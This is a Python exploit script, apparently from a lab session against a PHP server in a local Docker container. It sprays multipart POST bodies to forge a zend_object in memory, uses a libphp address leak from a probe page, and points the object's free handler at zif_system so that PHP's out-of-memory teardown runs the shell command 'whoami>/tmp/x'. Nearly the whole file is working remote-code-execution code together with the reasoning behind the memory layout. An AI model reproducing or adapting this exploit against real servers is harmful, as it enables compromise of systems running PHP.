#!/usr/bin/env python3
"""oom116: SELF-TYPING RUN — every slot points at the block.

Laws this builds on (all empirically established tonight / in repo):
  - payload68 key_part: reps = 1537//len(tile). Tile MUST be 16B
    (reps=96 -> 1536B). 2048B tile -> reps=0 -> value silently "P".
  - Walked zval window: value = window[0:8], ti = window[8:12].
    phase dependence killed by making EVERY 8B slot = B:
    cell16 = le64(B)+le64(B). Any window: value=B, ti=B lo4.
  - B chosen with: B&0xF == 8 (IS_OBJECT), (B>>8)&1 == 1
    (DESTRUCTOR_CALLED -> store_del skips dtor, no ce deref),
    (B>>9)&1 == 0 (FREE_CALLED clear -> free_obj IS called).
    Then ti = B&0xFFFFFFFF self-types every window legally.
  - Values = binary-safe carrier (NULs OK) -> block rides in
    part 13's value. Names carry the same run (bytes name-safe
    by construction: 08/19/66/42/1b/7f-style, no banned bytes).
  - store_del disasm: handlers @OBJ+0x18, call *0x8(%rdx) ->
    free_obj = TBL+8. num_args @+0x2C (oom91 instrumented 9/9).
  - Values arena address stable across same-shaped posts in one
    worker boot (oom114c 'PPPP' readback evidence) -> B computed
    from marker post's C0 lands in armed post's part13 value.
  - Same-request arm+fire: armed body's own OOM teardown walks
    its own run -> dispatch within the request (oom91 shape).

Block (184B) at B:
  +0x00 rc=1, ti=0x108 | +0x08 handle=1 | +0x10 ce=0
  +0x18 handlers=B+0x68 | +0x2C num_args=1
  +0x50 arg.value=B+0x90, +0x58 type=6, +0x5C ti=0x106
  +0x68 TBL | +0x70 TBL+8 = base+0x39b8a0 (zif_system)
  +0x90 GS hdr <IIQI>(1,0x106,0,13) | +0xA8 "whoami>/tmp/x\\0"
All block-internal windows decode benign (nibbles 0/1 -> skip),
so no block window can crash before a run window dispatches.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
CMD = b"whoami>/tmp/x"
ZIF = 0x39B8A0
VMARK = b"QMARK7XY" * 3            # 24B, passes probe >=16-byte guard
MARK_CELL = VMARK[:16]
WARM = b"WARMUPX" * 24 + b"W" * 400
K1 = 3400
STRIDE = 3584                       # measured values-string stride
BLK = 0xB8                          # block size


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post_bound(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def probe_scan(needle, chunk=262144, maxc=8):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            offs = []
            for line in out.splitlines():
                line = line.strip()
                if not line.startswith("R="):
                    continue
                m = re.search(r"d=((?:0x)?[0-9a-f]+(?: (?:0x)?[0-9a-f]+)*)", line)
                if m:
                    for tok in m.group(1).split():
                        v = int(tok, 16)
                        if v > 0x10000:
                            offs.append(v)
            if offs:
                return offs
        time.sleep(0.7)
    return []


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


def x_check():
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c",
                        "cat /tmp/x 2>&1; ls -la /tmp/core 2>&1"],
                       capture_output=True, timeout=30)
    return (r.stdout + r.stderr).decode("latin1").strip()


def cell_of(addr):
    return struct.pack("<Q", addr) * 2      # 16B: B,B


def make_block_tile(base_addr, off):
    """1536B tile for the block-carrying part: run up to off, block, run."""
    B = base_addr
    t = bytearray(cell_of(B) * 96)          # 1536B of pure run
    st = struct.pack_into
    st("<II", t, off + 0x00, 1, 0x108)      # rc, ti
    st("<II", t, off + 0x08, 1, 0)          # handle, pad
    st("<Q", t, off + 0x10, 0)              # ce (never deref'd, bit8 set)
    st("<Q", t, off + 0x18, B + 0x68)       # handlers -> TBL
    st("<I", t, off + 0x2C, 1)              # num_args
    st("<Q", t, off + 0x50, B + 0x90)       # arg.value -> GS
    t[off + 0x58] = 6                       # arg type IS_STRING
    st("<I", t, off + 0x5C, 0x106)          # arg ti
    st("<Q", t, off + 0x68, 0)              # TBL+0 unused
    st("<Q", t, off + 0x70, BASE + ZIF)     # TBL+8 = free_obj
    st("<IIQI", t, off + 0x90, 1, 0x106, 0, len(CMD))   # GS hdr (24B)
    t[off + 0xA8: off + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    return bytes(t)


def build_body(run_cell, block_tile=None, block_part=None):
    """Stock-recipe body: names = all-skip tile (0x02: every window reads
    type 2 -> quiet skip, NUL-free so names survive); values = B,B run
    (binary-safe carrier carries the clean 8-byte pointer incl. 00 00);
    block part's value = run up to OFF, then the 184B block."""
    skip = b"\x02" * 16

    def vt(i):
        if block_tile is not None and i == block_part:
            return block_tile
        return run_cell

    ps = [P.key_part(i, pattern=skip, value_tile=vt(i)) for i in range(K1)]
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps += [P.key_part(i, pattern=skip, value_tile=vt(i)) for i in range(K1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


print("=== oom116: self-typing run, same-request dispatch ===", flush=True)
for i in range(20):
    post_bound(WARM[:0] or WARM)            # warm arena (non-multipart ok)

BASE = base_now()
assert BASE, "no libphp base"
print("base=0x%x" % BASE, flush=True)

# [1] marker post -> measure values arena C0
post_bound(build_body(MARK_CELL))
offs = probe_scan(VMARK)
assert offs, "marker not found in values arena"
C0 = offs[0]
print("C0=0x%x (stride check: %s)" % (C0, [hex(o - C0) for o in offs[1:4]]), flush=True)

# [2] choose B: inside part PART's value, legal self-typing bits
PART = 13
VSTART = C0 + STRIDE * PART
lo, hi = 0x100, 1536 - BLK - 16
B = OFF = None
for off in range(lo, hi):
    cand = VSTART + off
    if cand & 0xF != 8:
        continue
    if (cand >> 8) & 1 != 1:
        continue
    if (cand >> 9) & 1 != 0:
        continue
    nb = cand.to_bytes(6, "little")
    if any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
        continue
    B, OFF = cand, off
    break
assert B, "no legal B found"
print("B=0x%x (part %d value +0x%x) bits: nib8=%d bit8=%d bit9=%d"
      % (B, PART, OFF, B & 0xF, (B >> 8) & 1, (B >> 9) & 1), flush=True)

# [3] armed body: run everywhere + block inside part PART's value
blk_tile = make_block_tile(B, OFF)
abody = build_body(cell_of(B), block_tile=blk_tile, block_part=PART)
print("armed body %.2f MB" % (len(abody) / 1048576.0), flush=True)

# [4] fire — same request arms and triggers
code, resp = post_bound(abody)
print("armed: code=%s resp=%r" % (code, resp[:120]), flush=True)
print("x/core: %s" % x_check(), flush=True)

# [5] one more legal shot if still silent (boot survives no-crash)
if "/tmp/x" not in x_check():
    offs2 = probe_scan(VMARK)
    if offs2 and offs2[0] != C0:
        C0 = offs2[0]
        VSTART = C0 + STRIDE * PART
        for off in range(lo, hi):
            cand = VSTART + off
            if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
                nb = cand.to_bytes(6, "little")
                if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
                    B, OFF = cand, off
                    break
        print("retry B=0x%x off=0x%x" % (B, OFF), flush=True)
        blk_tile = make_block_tile(B, OFF)
        abody = build_body(cell_of(B), block_tile=blk_tile, block_part=PART)
        code, resp = post_bound(abody)
        print("retry: code=%s resp=%r" % (code, resp[:120]), flush=True)
        print("x/core: %s" % x_check(), flush=True)

print("=== done ===", flush=True)
